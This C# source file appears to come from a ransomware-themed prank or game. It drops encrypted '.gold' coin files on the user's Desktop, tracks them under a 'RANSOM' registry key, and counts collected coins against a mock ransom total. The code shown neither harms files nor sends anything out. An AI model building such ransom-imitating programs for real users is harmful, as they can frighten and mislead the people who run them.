using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

namespace rans0m
{

    public static class GoldCoinManager
    {
        private const string RegistryValueName = "GoldCoins"; // REG_MULTI_SZ

        public sealed record CoinDef(string Path, int Value, bool IsHoneyPot);

        /// <summary>Coin face values matching Gold_X.png files in the exe dir.</summary>
        public static readonly int[] CoinValues = new[] { 5, 10, 25, 50, 75, 100 };

        public const double HoneyPotChance = 0.05;

        /// <summary>
        /// Creates coins DESKTOP-ONLY per request. Drops .gold files directly on
        /// the user's Desktop (no subfolders, no Documents/Music/etc).
        /// Each file: {"RANSOM_COIN": id, "VALUE": 5/10/25/50/75/100, "HONEY": 0/1}.
        /// 5% of coins are Honey_Pot (pays the full 500 requirement).
        /// Returns the created coin definitions (path + value + honeypot flag).
        /// </summary>
        public static List<CoinDef> CreateRandomCoins(int count)
        {
            var created = new List<CoinDef>();
            string desktop = GetDesktopDir();
            if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop)) return created;
            try { Directory.CreateDirectory(desktop); } catch { return created; }
            if (!HasWriteAccess(desktop)) return created;

            List<string> createdPaths = new List<string>();

            for (int i = 0; i < count; i++)
            {
                bool done = false;
                for (int attempt = 0; attempt < 3 && !done; attempt++)
                {
                    try
                    {
                        // Desktop root only - no subfolder wandering
                        string targetDir = desktop;

                        string randomString = Guid.NewGuid().ToString("N");
                        bool honey = Global.RngNext(100) < 5; // 5% Honey_Pot
                        int coinValue = honey ? Global.RansomTarget
                            : CoinValues[Global.RngNext(CoinValues.Length)];

                        Dictionary<string, string> payload = new()
                        {
                            { "RANSOM_COIN", randomString },
                            { "VALUE", coinValue.ToString() },
                            { "HONEY", honey ? "1" : "0" }
                        };

                        string json = JsonSerializer.Serialize(payload);
                        byte[] jsonBytes = Encoding.UTF8.GetBytes(json);
                        byte[] encrypted = ProtectedData.Protect(jsonBytes, null, DataProtectionScope.CurrentUser);

                        string fileName = $"{Guid.NewGuid():N}.gold";
                        string fullPath = Path.Combine(targetDir, fileName);

                        // Ensure no collision (extremely unlikely but check)
                        if (File.Exists(fullPath)) continue;

                        File.WriteAllBytes(fullPath, encrypted);
                        // Verify file was written
                        if (!File.Exists(fullPath)) continue;

                        createdPaths.Add(fullPath);
                        created.Add(new CoinDef(fullPath, coinValue, honey));
                        done = true;
                    }
                    catch { } // skip coin on error
                }
            }

            if (createdPaths.Count > 0)
                AppendToRegistryList(createdPaths);
            return created;
        }

        /// <summary>
        /// Deletes all .gold files and removes them from the Registry.
        /// Also clears Global.usedCoins to prevent accumulation bug.
        /// Handles orphaned files gracefully.
        /// </summary>
        public static void DeleteAllCoins()
        {
            List<string>? paths = GetRegistryFileList();
            if (paths != null)
            {
                foreach (string path in paths)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }

                try
                {
                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\RANSOM"))
                    {
                        if (key != null)
                            key.DeleteValue(RegistryValueName, false);
                    }
                }
                catch { }
            }
            // Always clear usedCoins - fixes bug where usedCoins accumulates forever
            try { Global.usedCoins.Clear(); } catch { }
        }

        /// <summary>
        /// Decrypts a .gold file and returns the dictionary inside.
        /// Validates file size and content to avoid crashes on tampered files.
        /// </summary>
        public static Dictionary<string, string> DecryptCoinFile(string filePath)
        {
            if (string.IsNullOrWhiteSpace(filePath)) throw new ArgumentException("Invalid path", nameof(filePath));
            if (!File.Exists(filePath)) throw new FileNotFoundException("Gold file not found", filePath);
            // Sanity size check - encrypted JSON should be < 10KB
            var info = new FileInfo(filePath);
            if (info.Length > 10240 || info.Length == 0) throw new InvalidDataException("Invalid gold file size");

            byte[] encrypted = File.ReadAllBytes(filePath);
            byte[] decryptedBytes;
            try { decryptedBytes = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser); }
            catch (CryptographicException ex) { throw new InvalidDataException("Failed to decrypt - wrong user or tampered file", ex); }

            string json = Encoding.UTF8.GetString(decryptedBytes);
            var dict = JsonSerializer.Deserialize<Dictionary<string, string>>(json);
            if (dict == null || !dict.ContainsKey("RANSOM_COIN")) throw new InvalidDataException("Invalid gold file content");
            return dict;
        }

        public sealed record CollectResult(int Value, bool IsHoneyPot, int SavedCredit);

        /// <summary>
        /// Discard a coin file with NO credit (used when a popup covers its
        /// on-screen coin - the coin is deleted, never paid out).
        /// </summary>
        public static void DiscardCoinFile(string? filePath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(filePath)) return;
                if (!filePath.EndsWith(".gold", StringComparison.OrdinalIgnoreCase)) return;
                try { if (File.Exists(filePath)) File.Delete(filePath); } catch { }
                try { RemoveFromRegistryList(filePath); } catch { }
            }
            catch { }
        }

        /// <summary>
        /// Collect a single coin by file path (click-to-collect, no drag needed).
        /// Honey_Pot pays the FULL remaining requirement; any amount beyond what
        /// is needed is saved into Global.goldCredit for the next ransom.
        /// </summary>
        public static CollectResult CollectCoinFile(string filePath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(filePath)) return new CollectResult(0, false, 0);
                if (!filePath.EndsWith(".gold", StringComparison.OrdinalIgnoreCase)) return new CollectResult(0, false, 0);
                if (!File.Exists(filePath)) return new CollectResult(0, false, 0);
                Dictionary<string, string> data;
                try { data = DecryptCoinFile(filePath); }
                catch { return new CollectResult(0, false, 0); }
                if (!data.TryGetValue("RANSOM_COIN", out var coinId)) return new CollectResult(0, false, 0);
                lock (Global.usedCoins)
                {
                    if (Global.usedCoins.Contains(coinId)) return new CollectResult(0, false, 0);
                    Global.usedCoins.Add(coinId);
                }
                int coinValue = 100;
                if (data.TryGetValue("VALUE", out var vs) && int.TryParse(vs, out var p)) coinValue = p;
                else if (data.TryGetValue("COIN_VALUE", out var vs2) && int.TryParse(vs2, out var p2)) coinValue = p2;
                bool honey = data.TryGetValue("HONEY", out var h) && h == "1";

                int before = Global.ransomLeft;
                int applied = Math.Min(coinValue, before);
                int overpay = Math.Max(0, coinValue - before);
                Global.ransomLeft = before - applied;
                int saved = 0;
                if (overpay > 0)
                {
                    Global.goldCredit += overpay;
                    saved = overpay;
                    FileLogger.Log($"[Gold] Overpay {overpay} saved as credit (total {Global.goldCredit})");
                }
                try { File.Delete(filePath); } catch { }
                try { RemoveFromRegistryList(filePath); } catch { }
                if (honey) FileLogger.Log($"[Gold] Honey_Pot collected! Paid {applied}, saved {saved}");
                return new CollectResult(applied, honey, saved);
            }
            catch { return new CollectResult(0, false, 0); }
        }

        /// <summary>
        /// Collect any one unused desktop coin (used by clickable overlay coins).
        /// </summary>
        public static CollectResult CollectAnyDesktopCoin()
        {
            try
            {
                string desktop = GetDesktopDir();
                if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop)) return new CollectResult(0, false, 0);
                string[] files;
                try { files = Directory.GetFiles(desktop, "*.gold"); } catch { return new CollectResult(0, false, 0); }
                foreach (var f in files)
                {
                    var r = CollectCoinFile(f);
                    if (r.Value > 0) return r;
                }
                return new CollectResult(0, false, 0);
            }
            catch { return new CollectResult(0, false, 0); }
        }

        public static string GetDesktopDir()
        {
            try
            {
                string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
                d = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
            catch { }
            return "";
        }

        private static void RemoveFromRegistryList(string path)
        {
            try
            {
                var list = GetRegistryFileList();
                if (list == null) return;
                list.RemoveAll(p => p.Equals(path, StringComparison.OrdinalIgnoreCase));
                SetRegistryFileList(list);
            }
            catch { }
        }

        // ----------------------------- INTERNAL HELPERS -----------------------------

        private static bool HasWriteAccess(string dir)
        {
            try
            {
                string test = Path.Combine(dir, $".ransom_test_{Guid.NewGuid():N}.tmp");
                File.WriteAllText(test, "test");
                File.Delete(test);
                return true;
            }
            catch { return false; }
        }

        private static List<string> GetUserDirectories()
        {
            var dirs = new List<string>();

            Environment.SpecialFolder[] specialFolders =
            {
                Environment.SpecialFolder.Desktop,
                Environment.SpecialFolder.MyDocuments,
                Environment.SpecialFolder.MyPictures,
                Environment.SpecialFolder.MyMusic,
                Environment.SpecialFolder.MyVideos,
                Environment.SpecialFolder.UserProfile
            };

            foreach (Environment.SpecialFolder sf in specialFolders)
            {
                try
                {
                    string path = Environment.GetFolderPath(sf);
                    if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                        dirs.Add(path);
                }
                catch { }
            }

            try
            {
                string downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                if (Directory.Exists(downloads))
                    dirs.Add(downloads);
            }
            catch { }

            // Filter out system-protected dirs that may be inside UserProfile
            dirs = dirs.Where(d =>
            {
                try
                {
                    var name = Path.GetFileName(d)?.ToLowerInvariant();
                    // Skip AppData etc if ever included
                    return name != "appdata";
                }
                catch { return true; }
            }).Distinct().ToList();

            // Fallback: at least ensure we have Desktop
            if (dirs.Count == 0)
            {
                try
                {
                    var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    if (!string.IsNullOrEmpty(desktop)) dirs.Add(desktop);
                }
                catch { }
            }

            return dirs;
        }

        private static string GetRandomSubfolder(string root)
        {
            try
            {
                string[] subDirs = Directory.GetDirectories(root);
                if (subDirs.Length == 0)
                    return root;

                // Filter out hidden/system dirs to avoid permission issues
                var filtered = subDirs.Where(d =>
                {
                    try
                    {
                        var di = new DirectoryInfo(d);
                        return (di.Attributes & FileAttributes.Hidden) == 0 && (di.Attributes & FileAttributes.System) == 0;
                    }
                    catch { return false; }
                }).ToArray();

                if (filtered.Length == 0) return root;
                return filtered[Global.RngNext(filtered.Length)];
            }
            catch { return root; }
        }
        
        private static void AppendToRegistryList(IEnumerable<string> newPaths)
        {
            try
            {
                List<string> existing = GetRegistryFileList() ?? new List<string>();
                existing.AddRange(newPaths);
                // Deduplicate
                existing = existing.Distinct().ToList();
                SetRegistryFileList(existing);
            }
            catch { }
        }

        private static List<string>? GetRegistryFileList()
        {
            try
            {
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\RANSOM"))
                {
                    if (key == null) return null;
                    object? value = key.GetValue(RegistryValueName);

                    if (value is string[] multiString)
                        return new List<string>(multiString);
                    // Handle if somehow stored as single string
                    if (value is string single)
                        return new List<string> { single };
                    return null;
                }
            }
            catch { return null; }
        }

        private static void SetRegistryFileList(List<string> paths)
        {
            try
            {
                using (RegistryKey? key = Registry.CurrentUser.CreateSubKey(@"Software\RANSOM"))
                {
                    if (key == null) return;
                    key.SetValue(RegistryValueName, paths.ToArray(), RegistryValueKind.MultiString);
                }
            }
            catch { }
        }
    }
}
